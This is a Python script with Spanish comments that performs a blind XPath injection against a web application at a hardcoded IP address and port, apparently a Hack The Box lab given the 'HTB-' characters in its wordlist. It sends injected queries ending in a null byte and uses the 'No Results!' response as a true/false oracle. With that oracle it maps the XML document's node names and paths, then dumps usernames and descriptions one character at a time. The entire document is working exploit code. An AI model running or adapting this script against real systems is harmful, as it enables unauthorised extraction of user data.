import requests

wordlist = "abcdefghijklmnopqrstuvwxyzHTB-0123456789{}"
#calcular numero de caracteres de los nodo texto de los ultimos nodo hijo
def calculate_n_caracteres(payload):
    for i in range(0,40):
        respuesta = requests.get(f"http://94.237.59.225:53017/index.php?q=trick') or string-length({payload}/text())={i}]\x00")
        if 'No Results!' not  in respuesta.text:
            return i
    return 0  

#calcular caracteres de los nodo texto de los ultimos nodo hijo
def value_caracteres(payload,longitud,wordlist):
    resultado = ""
    for i in range(1,longitud+1):
        for j in wordlist:
            respuesta = requests.get(f"http://94.237.59.225:53017/index.php?q=trick') or substring({payload}/text(),{i},1)='{j}']\x00")
            if 'No Results!' not in respuesta.text:
                resultado += j
                break
    return resultado

#calcular longitud del nombre del nodo
def calculate_length_nodo(payload):
    for i in range(0,20):
        respuesta = requests.get(f"http://94.237.59.225:53017/index.php?q=trick') or string-length(name({payload}))={i}]\x00")
        if 'No Results!' not in respuesta.text:
            return i
    return 0

##calcular nombre del nodo
def calculate_name_nodo(longitud,payload):
    nombre = ""
    for i in range(1,longitud+1):
        for j in wordlist:
            respuesta = requests.get(f"http://94.237.59.225:53017/index.php?q=trick') or substring(name({payload}),{i},1)='{j}']\x00")
            if 'No Results!' not in respuesta.text:
                nombre += j
                break
    return nombre

##calcular el numero de hijos del nodo
def calculate_child_node(nombre):
    for i in range(1,20):
        respuesta = requests.get(f"http://94.237.59.225:53017/index.php?q=trick') or count(/{nombre}/*)={i}]\x00")
        if 'No Results!' not in respuesta.text:
            return i
    return 0
acumulando = ''
payload = ''
rutas = []
def esquema_XML(acumulando,payload,rutas):
    if acumulando == '':
        payload = '/*[1]'
    longitud = calculate_length_nodo(payload)
    if longitud == 0:
        return
    name = calculate_name_nodo(longitud,payload)
    if acumulando == '':
        acumulando = name
        n_hijos = calculate_child_node(name)
    else:
        acumulando = acumulando + '/'+name
        n_hijos = calculate_child_node(acumulando)
    print(f"Nombre del nodo: {name}")
    if n_hijos == 0:
            rutas.append('/'+acumulando)
            return
    else:
        print(f"Numero de nodos hijos del nodo anterior: {n_hijos}")
    for i in range(1,n_hijos+1):
        payload = '/'+acumulando+f'/*[{i}]'
        esquema_XML(acumulando,payload,rutas)

esquema_XML(acumulando,payload,rutas)

##Enumeracion de rutas XPath posibles
rutas = list(set(rutas))
for i in range(0,len(rutas)):
    print(f"Una ruta que podemos utilizar en nuestras inyecciones XPath: {rutas[i]}")

##Volcado de usernames con sus descripciones correspondientes
rutas_usernames_desc = []
for i in rutas:
    for j in range(1,4):
        if 'username' in i or 'desc' in i:
            rutas_usernames_desc.append(i.replace('/group',f'/group[{j}]'))
for i in range(0,len(rutas_usernames_desc)):
        n_caracteres = calculate_n_caracteres(rutas_usernames_desc[i])
        resultado = value_caracteres(rutas_usernames_desc[i],n_caracteres,wordlist)
        if rutas_usernames_desc[i].find('username') != -1:
            print(f"Un username valido es el siguiente: {resultado}")
        else:
            print(f"La descripcion asociado a un username valido es el siguiente: {resultado}")
